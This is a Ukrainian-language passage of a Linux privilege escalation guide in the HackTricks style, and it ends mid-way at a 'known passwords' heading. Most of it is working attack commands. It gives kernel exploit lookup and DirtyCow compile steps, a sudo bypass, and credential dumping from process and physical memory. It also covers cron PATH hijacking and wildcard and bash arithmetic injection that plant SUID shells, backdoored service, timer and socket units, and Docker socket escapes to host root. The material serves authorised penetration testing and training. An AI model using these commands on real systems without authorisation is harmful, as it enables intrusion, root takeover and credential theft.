# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Відомості про ОС

Почнемо отримувати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **маєте права запису в будь-яку папку всередині змінної `PATH`**, ви можете перехопити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про Env

Чи є в змінних оточення цікава інформація, паролі або API keys?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію ядра та чи існує якийсь exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список уразливих ядер та деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі версії уразливих ядер з цього ресурсу, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Завжди **пошукайте версію kernel у Google**, можливо саме ваша версія kernel вказана в якому-небудь kernel exploit — тоді ви будете впевнені, що цей exploit дійсний.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, що вказані в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg перевірка підпису не пройшла

Перегляньте **smasher2 box of HTB** як **приклад** того, як цей vuln може бути експлуатований.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Більш детальне перерахування системи
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічіть можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви знаходитеся всередині docker container ви можете спробувати втекти з нього:

{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і що не змонтовано**, де і навіщо. Якщо щось не змонтовано, ви можете спробувати змонтувати це і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічити корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо вам потрібно використати якийсь kernel exploit, оскільки рекомендовано компілювати його на машині, де ви збираєтеся його використовувати (або на схожій).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна експлуатувати для escalating privileges…\
Рекомендується вручну перевірити версії найбільш підозрілих встановлених програм.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використовувати **openVAS** для перевірки застарілого або вразливого програмного забезпечення, встановленого на ній.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть велику кількість інформації, яка переважно буде марною; тому рекомендовано використовувати додатки на кшталт OpenVAS або подібні, які перевірять, чи якась встановлена версія ПЗ вразлива до відомих exploits_

## Процеси

Подивіться, **які саме процеси** виконуються і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинно бути** (можливо tomcat запускається від root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте наявність можливих [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарних файлів процесів**, можливо, ви зможете перезаписати чиїсь файли.

### Process monitoring

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy), для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які часто запускаються або коли виконуються певні умови.

### Process memory

Деякі сервіси на сервері зберігають **credentials in clear text inside the memory**.\
Зазвичай вам знадобляться **root privileges** для читання пам'яті процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти більше credentials.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які належать вам**.

> [!WARNING]
> Зверніть увагу, що сьогодні більшість машин **за замовчуванням не дозволяють ptrace**, що означає, що ви не зможете дампити інші процеси, що належать вашому непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Якщо ви маєте доступ до пам'яті сервісу (наприклад, FTP), ви можете отримати Heap і шукати в ньому credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого process ID, **maps показують, як пам'ять відображається у віртуальному адресному просторі цього процесу**; вони також показують **права доступу для кожного відображеного регіону**. Псевдо-файл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми дізнаємося, які **регіони пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **просунутися у файл mem і вивантажити всі доступні для читання регіони** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. Віртуальний адресний простір ядра можна отримати через /dev/kmem.\  
Зазвичай, `/dev/mem` доступний для читання лише користувачу **root** і групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це переосмислення для Linux класичного інструменту ProcDump із набору інструментів Sysinternals для Windows. Доступно за адресою [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зробити дамп пам'яті процесу, ви можете використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимоги root і зняти дамп процесу, який належить вам
- Script A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете зробити дамп процесу (див. попередні розділи, щоб знайти різні способи дампування пам'яті процесу) і шукати облікові дані в пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому тексті з пам'яті** та з деяких **відомих файлів**. Вимагає привілеїв root для коректної роботи.

| Функція                                           | Назва процесу        |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошук Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron завдання

Перевірте, чи є якесь заплановане завдання вразливим. Можливо, ви можете скористатися тим, що скрипт виконується від імені root (wildcard vuln? чи можна змінювати файли, які використовує root? використовувати symlinks? створити спеціальні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Шлях PATH для Cron

Наприклад, у _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права запису над /home/user_)

Якщо в цьому crontab користувач root намагається виконати якусь команду або скрипт, не встановивши PATH. Наприклад: _\* \* \* \* root overwrite.sh_\

Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, що виконує скрипт із підстановним символом (Wildcard Injection)

Якщо скрипт, що виконується від імені root, містить “**\***” всередині команди, це можна використати, щоб спричинити непередбачувану поведінку (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху, наприклад** _**/some/path/\***_, **це не вразливе (навіть** _**./\***_ **не є).**

Прочитайте наступну сторінку для додаткових трюків з експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion та command substitution перед arithmetic evaluation у ((...)), $((...)) та let. Якщо root cron/parser читає untrusted log fields і передає їх в arithmetic context, attacker може інжектувати command substitution $(...), який виконуватиметься як root, коли cron запуститься.

- Чому це працює: У Bash розгортання відбувається в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Отже значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (команда виконується), а потім залишкова цифра `0` використовується для арифметики, тому скрипт продовжує роботу без помилок.

- Типовий вразливий шаблон:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: Запишіть attacker-controlled текст у парсований лог так, щоб поле, схоже на число, містило command substitution і закінчувалося цифрою. Переконайтеся, що ваша команда не пише в stdout (або перенаправте його), щоб арифметика залишалася валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **можете змінити cron script** що виконується від імені root, ви дуже легко можете отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, який виконується від імені root, використовує **директорію, до якої ви маєте повний доступ**, можливо, варто видалити цю папку та **створити symlink папку, що вказує на іншу, яка буде запускати script під вашим контролем**
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron jobs

Ви можете відстежувати процеси, щоб знайти ті, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і escalate privileges.

Наприклад, щоб **відстежувати кожні 0.1s протягом 1 хвилини**, **сортувати за найменш часто виконуваними командами** та видалити команди, які виконувалися найчастіше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (це буде моніторити та перераховувати кожен процес, який запускається).

### Невидимі cron jobs

Можна створити cronjob **putting a carriage return after a comment** (без newline character), і cron job працюватиме. Приклад (зауважте carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Служби

### Файли _.service_, доступні для запису

Перевірте, чи можете ви записати будь-який `.service` файл, якщо так, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor коли** служба **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться почекати, поки машина не буде перезавантажена).\
Наприклад, створіть ваш backdoor всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Бінарні файли служб, доступні для запису

Майте на увазі, що якщо у вас є **права запису над бінарними файлами, які виконуються службами**, ви можете замінити їх на backdoors, тому коли служби будуть повторно виконані, backdoors також будуть виконані.

### systemd PATH - Відносні шляхи

Ви можете переглянути PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** у будь-якій із папок цього шляху, це може дозволити вам **escalate privileges**. Потрібно шукати **відносні шляхи, що використовуються у файлах конфігурації сервісів**, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тим самим ім'ям, що й бінарний файл за відносним шляхом** всередині папки PATH systemd, до якої ви маєте права запису, і коли сервіс буде запитано виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти сервіси, але перевірте, чи можете використати `sudo -l`).

**Дізнайтеся більше про сервіси за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit files, назва яких закінчується на `**.timer**`, що керують `**.service**` файлами або подіями. **Таймери** можуть бути використані як альтернатива cron, оскільки вони мають вбудовану підтримку календарних подій і монотонних часових подій та можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти systemd unit (наприклад, `.service`), який **виконує бінарний файл, у який можна записувати**
- Знайти systemd unit, який **виконує відносний шлях** і над яким ви маєте **права запису** у **systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтеся більше про timers за допомогою `man systemd.timer`.**

### **Увімкнення Timer**

Щоб увімкнути timer, вам потрібні root-привілеї і потрібно виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Приймає логічний аргумент. Якщо **true**, для кожного вхідного з'єднання створюється окремий екземпляр сервісу, і йому передається тільки сокет з'єднання. Якщо **false**, всі прослуховувані сокети самі **передаються до запущеного service unit**, і створюється лише один екземпляр сервісу для всіх з'єднань. Це значення ігнорується для datagram сокетів та FIFO, де один сервісний екземпляр безумовно обробляє весь вхідний трафік. **Defaults to false**. З міркувань продуктивності рекомендовано писати нові демони таким чином, щоб вони були сумісні з `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймає один або декілька рядків команд, які **виконуються перед** або **після** створення та прив'язки прослуховуваних **сокетів**/FIFO відповідно. Перший токен командного рядка повинен бути абсолютним шляхом до файлу, після якого йдуть аргументи для процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються перед** або **після** закриття та видалення прослуховуваних **сокетів**/FIFO відповідно.
- `Service`: Вказує ім'я **service** unit, яке **активується** при **вхідному трафіку**. Ця опція дозволена лише для сокетів з Accept=no. За замовчуванням використовується сервіс з тим самим ім'ям, що й сокет (з відповідною заміною суфікса). У більшості випадків використання цієї опції не є необхідним.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть існувати деякі **sockets listening for HTTP** запити (_я не маю на увазі .socket files, а файли, що діють як unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає на HTTP** запит, то ви можете **спілкуватися** з ним і можливо **exploit some vulnerability**.

### Docker сокет, доступний для запису

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є права запису в цей Docker сокет, ви можете escalate privileges, використовуючи наступні команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з доступом root до файлової системи хоста.

#### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, з Docker socket все ще можна працювати через Docker API та команди `curl`.

1.  **List Docker Images:** Отримайте список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Відправте запит на створення контейнера, який монтує кореневий каталог файлової системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення підключення до контейнера, що дозволить виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після встановлення з'єднання `socat` ви можете виконувати команди безпосередньо в контейнері з правами root у файловій системі хоста.

### Інше

Зауважте, що якщо у вас є права запису на docker socket тому що ви **входите до групи `docker`** у вас є [**більше способів підвищити привілеї**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** ви також зможете його скомпрометувати](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **більше способів вийти з docker або зловживати ним для підвищення привілеїв** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система міжпроцесної взаємодії (inter-Process Communication, IPC), яка дозволяє застосункам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної Linux-системи, вона пропонує надійну структуру для різних форм комунікації між додатками.

Система є універсальною, підтримуючи базовий IPC, який поліпшує обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона сприяє трансляції подій або сигналів, забезпечуючи безшовну інтеграцію між компонентами системи. Наприклад, сигнал від демонa Bluetooth про вхідний дзвінок може змусити музичний плеєр приглушити звук, покращуючи досвід користувача. Додатково, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів та виклики методів між додатками, оптимізуючи процеси, які раніше були складнішими.

D-Bus працює за моделлю дозволити/заборонити (allow/deny), керуючи дозволами на повідомлення (виклики методів, емісія сигналів тощо) на основі кумулятивного ефекту правил політики, що збігаються. Ці політики визначають взаємодії з шиною і потенційно можуть дозволити ескалацію привілеїв через експлуатацію цих дозволів.

Приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf` наведено нижче, детально описуючи дозволи для користувача root на володіння, надсилання та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача чи групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate та exploit D-Bus communication тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу і визначити розташування машини.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Завжди перевіряйте network services, що працюють на машині, з якими ви не могли взаємодіяти перед отриманням доступу до неї:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff трафік. Якщо так, ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна енумерація

Перевірте, **who** ви є, які **privileges** у вас є, які **users** є в системі, хто може **login** і хто має **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були вражені багом, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Детальніше: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **учасником якоїсь групи**, яка може надати вам права root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

